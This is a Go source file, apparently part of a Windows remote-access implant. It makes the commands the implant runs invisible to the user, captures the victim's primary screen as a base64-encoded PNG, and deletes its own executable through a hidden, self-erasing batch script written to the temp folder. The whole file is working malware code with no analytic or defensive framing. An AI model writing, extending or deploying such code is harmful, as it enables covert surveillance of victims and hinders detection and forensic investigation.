// implant/exec_attrs_windows.go
//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png" // Or image/jpeg
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

func init() {
	// Assign implementations to the declared vars in main.go
	doSelfDelete = doSelfDeleteWindows
	setOSSpecificAttrs = setOSSpecificAttrsWindows
	takeScreenshot = takeScreenshotWindows // Assign platform-specific screenshot function
}

// setOSSpecificAttrsWindows sets Windows-specific attributes for commands executed by the implant.
func setOSSpecificAttrsWindows(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW for child commands too
	}
}

// takeScreenshotWindows captures the primary display and returns it as a base64 encoded PNG string.
func takeScreenshotWindows() (string, error) {
	// NumActiveDisplays can tell you how many screens. We capture primary (0).
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	// Corrected: GetDisplayBounds returns one value (image.Rectangle)
	bounds := screenshot.GetDisplayBounds(0) // Primary display

	// Check if the bounds are valid (non-empty)
	if bounds.Dx() == 0 || bounds.Dy() == 0 {
		return "", fmt.Errorf("failed to get valid display bounds for display 0 (empty or zero-size)")
	}

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %w", err)
	}

	// Encode the image to PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", fmt.Errorf("failed to encode png: %w", err)
	}

	// Convert to base64 string
	imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
	return imgBase64Str, nil
}

// doSelfDeleteWindows attempts to delete the current executable on Windows.
func doSelfDeleteWindows(exePath string) {
	go func() {
		time.Sleep(2 * time.Second)
		absExePath, err := filepath.Abs(exePath)
		if err != nil {
			return
		}
		batchContent := fmt.Sprintf(`@echo off
chcp 65001 > nul
setlocal
set "targetFile=%s"
set "retryCount=0"
set "maxRetries=5" 
:DELETE_LOOP
timeout /t 1 /nobreak > nul
del /F /Q "%s"
if exist "%s" (
    set /a retryCount+=1
    if !retryCount! lss !maxRetries! (
        goto DELETE_LOOP
    )
)
endlocal
del "%%~f0"
`, absExePath, absExePath, absExePath)
		tempDir := os.TempDir()
		batchFileName := fmt.Sprintf("sdel_%d.bat", time.Now().UnixNano())
		batchFilePath := filepath.Join(tempDir, batchFileName)
		err = os.WriteFile(batchFilePath, []byte(batchContent), 0700)
		if err != nil {
			return
		}
		cmd := exec.Command("cmd.exe", "/C", batchFilePath)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000,
		}
		err = cmd.Start()
		if err != nil {
			_ = os.Remove(batchFilePath)
		} else {
			_ = cmd.Process.Release()
		}
	}()
}
